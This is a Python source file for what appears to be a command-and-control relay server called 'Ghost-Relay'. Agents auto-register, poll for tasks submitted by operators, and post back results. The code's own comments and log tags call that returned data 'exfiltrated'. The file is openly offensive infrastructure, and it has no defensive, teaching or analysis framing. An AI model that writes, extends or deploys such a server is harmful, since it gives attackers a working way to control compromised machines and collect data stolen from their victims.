from aiohttp import web
import asyncio
import json
import logging
import secrets
import traceback
import os
from datetime import datetime, timezone
from typing import Dict, List, Optional

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ghost_relay.log'),
        logging.StreamHandler()
    ]
)

class GhostRelayServer:
    def __init__(self, host: str = "0.0.0.0", port: int = 8443):
        self.host = host
        self.port = port
        self.agents: Dict[str, Dict] = {}
        self.task_queue: asyncio.Queue = asyncio.Queue()
        self.master_key = secrets.token_bytes(32)
        self.logger = logging.getLogger(__name__)
        
    async def start(self):
        """Initialize server"""
        self.logger.info(f"Ghost-Relay Server starting on {self.host}:{self.port}")
        app = web.Application()
        
        # Register Routes
        app.router.add_route('POST', '/api/v1/auth', self.handle_auth)
        app.router.add_route('POST', '/api/v1/task', self.handle_task_submit)
        app.router.add_route('GET', '/api/v1/heartbeat/{agent_id}', self.handle_heartbeat)
        # Result Exfiltration Route
        app.router.add_route('POST', '/api/v1/result/{agent_id}', self.handle_result)
        
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, self.host, self.port)
        await site.start()
        self.logger.info("Server listening.")
        
        asyncio.create_task(self.mesh_maintainer())
        asyncio.create_task(self.task_dispatcher())
        
        try:
            while True:
                await asyncio.sleep(60)
        except KeyboardInterrupt:
            self.logger.warning("Shutting down...")
        finally:
            await runner.cleanup()

    async def handle_auth(self, request: web.Request):
        try:
            data = await request.json()
            self.logger.info("Agent handshake received.")
            return web.json_response({
                "status": "authorized",
                "session_nonce": secrets.token_hex(12),
                "mesh_config": {"peers": [], "max_hops": 3}
            })
        except Exception as e:
            self.logger.error(f"Auth failed: {str(e)}")
            return web.json_response({"error": "Internal error"}, status=500)

    async def handle_task_submit(self, request: web.Request):
        """Receive encrypted tasks from operators"""
        try:
            data = await request.json()
            task_id = data.get('task_id')
            target_agent = data.get('target_agent')
            payload = data.get('payload')
            
            # FIXED: Allow empty payload dicts
            if not task_id or not target_agent:
                return web.json_response({"error": "Missing fields"}, status=400)
            
            if payload is None:
                payload = {}
            
            await self.task_queue.put({
                'task_id': task_id,
                'target': target_agent,
                'payload': payload,
                'timestamp': datetime.now(timezone.utc).isoformat()
            })
            
            self.logger.info(f"Task {task_id} queued for agent {target_agent}")
            return web.json_response({"status": "queued"})
        except Exception as e:
            self.logger.error(f"Task submission failed: {str(e)}")
            traceback.print_exc()
            return web.json_response({"error": "Submission failed"}, status=500)

    async def handle_heartbeat(self, request: web.Request):
        agent_id = request.match_info['agent_id']
        
        if agent_id not in self.agents:
            self.agents[agent_id] = {
                'last_seen': datetime.now(timezone.utc).isoformat(),
                'mesh_peers': [],
                'status': 'active',
                'public_key': None
            }
            self.logger.info(f"Auto-registered agent: {agent_id}")
            
        self.agents[agent_id]['last_seen'] = datetime.now(timezone.utc).isoformat()
        
        tasks = []
        remaining_tasks = []
        
        while True:
            try:
                task = await asyncio.wait_for(self.task_queue.get(), timeout=0.01)
                if task['target'] == agent_id:
                    tasks.append(task)
                    self.logger.info(f"Delivered task {task['task_id']} to agent {agent_id}")
                else:
                    remaining_tasks.append(task)
            except asyncio.TimeoutError:
                break
        
        for task in remaining_tasks:
            await self.task_queue.put(task)
        
        return web.json_response({
            "status": "ok",
            "tasks": tasks,
            "mesh_update": {
                "active_peers": [aid for aid, info in self.agents.items() 
                               if datetime.fromisoformat(info['last_seen']).timestamp() > datetime.now(timezone.utc).timestamp() - 300]
            }
        })

    async def handle_result(self, request: web.Request):
        """Handle exfiltrated data from agents"""
        try:
            agent_id = request.match_info['agent_id']
            data = await request.json()
            
            task_id = data.get('task_id')
            result_data = data.get('result')
            
            if not task_id or not result_data:
                return web.json_response({"error": "Missing result data"}, status=400)
            
            self.logger.info(f"[EXFIL] Received data for Task {task_id} from {agent_id}")
            self.logger.debug(json.dumps(result_data))
            
            # Save to disk
            os.makedirs("results", exist_ok=True)
            filename = f"results/{agent_id}_{task_id}.json"
            
            with open(filename, "w") as f:
                json.dump({
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "task_id": task_id,
                    "source_agent": agent_id,
                    "data": result_data
                }, f, indent=2)
            
            self.logger.info(f"Data saved to {filename}")
            return web.json_response({"status": "received"})
            
        except Exception as e:
            self.logger.error(f"Result handling failed: {str(e)}")
            traceback.print_exc()
            return web.json_response({"error": "Exfil failed"}, status=500)

    async def mesh_maintainer(self):
        while True:
            await asyncio.sleep(300)
            current_time = datetime.now(timezone.utc).timestamp()
            stale = [aid for aid, info in self.agents.items()
                    if current_time - datetime.fromisoformat(info['last_seen']).timestamp() > 900]
            for aid in stale:
                del self.agents[aid]
                self.logger.warning(f"Pruned stale agent: {aid}")

    async def task_dispatcher(self):
        pass

if __name__ == "__main__":
    server = GhostRelayServer()
    asyncio.run(server.start())
